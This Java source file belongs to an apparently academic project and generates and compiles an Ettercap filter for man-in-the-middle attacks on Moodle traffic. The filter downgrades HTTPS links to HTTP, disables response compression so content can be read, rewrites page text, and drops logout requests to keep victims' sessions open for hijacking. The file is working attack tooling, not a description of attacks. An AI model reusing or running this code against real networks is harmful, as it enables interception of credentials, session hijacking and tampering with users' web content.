/**
* Copyright (C) 2012 Iakovos Gurulian and Antonis Mavris
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

package org.com.comsec.engine;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class CreateFilter {

	private boolean bLogout = false;
	private boolean aText = false;

	// Creating the file

	/**
	 * Creating a filter
	 * 
	 */
	public boolean createFilter(String origText, String changedText) {
		String file_name = "Moodle.filter";
		File file = new File(file_name);
		boolean exist = false;

		try {
			exist = file.createNewFile();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		FileWriter fstream = null;
		try {
			fstream = new FileWriter(file_name);
			BufferedWriter out = new BufferedWriter(fstream);
			// String[]
			out.write("if (ip.proto == TCP && tcp.dst == 80) {\n");
			out.write("\tif (search(DATA.data, \"Accept-Encoding\")) {\n");
			out.write("\t\treplace(\"Accept-Encoding\", \"Accept-Rubbish!\");\n");
			out.write("\t}\n");
			out.write("}\n");

			if (aText)
				changeText(origText, changedText, out);
			if (bLogout)
				dropPacket(out);
			removeSSL(out);

			out.close();
			return true;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
			// }

		}

	}

	private void changeText(String origText, String changedText,
			BufferedWriter out) {
		try {
			out.write("if (ip.proto == TCP && tcp.src == 80) {\n");
			out.write("\treplace(\"" + origText + "\", \"" + changedText
					+ "\");\n");
			out.write("}\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void alterText(boolean enabled) {
		if (enabled)
			aText = true;
		else
			aText = false;
	}

	private void removeSSL(BufferedWriter out) {
		try {
			out.write("if (ip.proto == TCP && tcp.src == 80) {\n");
			out.write("\treplace(\"https:\", \"http:\");\n");
			out.write("}\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// Drops the logout packet in order to keep the session active.
	private void dropPacket(BufferedWriter out) {
		// TODO change contained text
		try {
			// GET /login/logout.php?sesskey=vxXX2X6x53 HTTP/1.1\\r\\n
			out.write("if (search(DECODED.data, \"GET /moodle/login/logout.php?sesskey=\")) {\n");
			out.write("\tdrop();\n");
			out.write("\tkill();\n");
			out.write("}\n");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void blockLogout(boolean enabled) {
		if (enabled)
			bLogout = true;
		else
			bLogout = false;
	}

	/**
	 * Compiling a filter
	 */
	public void compileFilter() {

		try {
			// Remove file for initialization
			String[] cmd = { "/bin/sh", "-c",
					"etterfilter Moodle.filter -o moodle.ef" };

			Process r = Runtime.getRuntime().exec(cmd);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

}
